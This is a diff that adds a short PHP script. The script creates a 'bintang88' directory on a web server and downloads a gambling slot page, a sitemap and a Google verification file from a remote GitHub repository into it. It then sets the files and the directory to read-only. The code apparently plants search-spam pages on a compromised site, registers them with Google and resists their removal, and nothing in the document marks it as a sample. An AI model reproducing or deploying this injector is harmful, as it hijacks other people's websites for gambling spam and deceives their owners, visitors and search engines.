@@ -1,0 +1,19 @@
+<?php
+$doc = '/www/bintang88/';
+$doc1 = '/www/bintang88/index.html';
+$doc2 = '/www/bintang88/sitemap.xml';
+$doc3 = '/www/bintang88/googleac434a374d6877e5.html';
+
+
+
+// echo $doc
+mkdir($doc);
+file_put_contents("/www/bintang88/index.html",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/slot.txt'));
+file_put_contents("/www/bintang88/sitemap.xml",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/sitemap.txt'));
+file_put_contents("/www/bintang88/googleac434a374d6877e5.html",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/gugel.txt'));
+chmod($doc1,0444);
+chmod($doc2,0444);
+chmod($doc3,044);
+chmod($doc,0555);
+
+?>
